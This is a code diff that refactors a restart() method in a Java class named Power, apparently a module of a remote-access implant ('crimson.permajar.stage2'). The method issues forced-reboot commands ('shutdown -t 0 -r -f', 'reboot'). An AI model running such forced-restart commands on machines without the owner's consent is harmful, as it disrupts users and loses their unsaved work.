@@ -17,11 +17,8 @@
  *******************************************************************************/
 package subterranean.crimson.permajar.stage2.modules;
 
-
-
 import java.io.IOException;
 
-import subterranean.crimson.permajar.stage1.PermaJar;
 import subterranean.crimson.universal.Logger;
 import subterranean.crimson.universal.Platform;
 
@@ -29,22 +26,24 @@ public class Power {
 
 	public static void restart() {
 		Logger.add("Restarting");
-		if (Platform.windows) {
+		switch (Platform.os) {
 
+		case WINDOWS:
 			try {
 				Runtime.getRuntime().exec("shutdown -t 0 -r -f");
 			} catch (IOException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
 			}
-
-		} else {
+			break;
+		default:
 			try {
 				Runtime.getRuntime().exec("reboot");
 			} catch (IOException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
 			}
+			break;
 
 		}
 
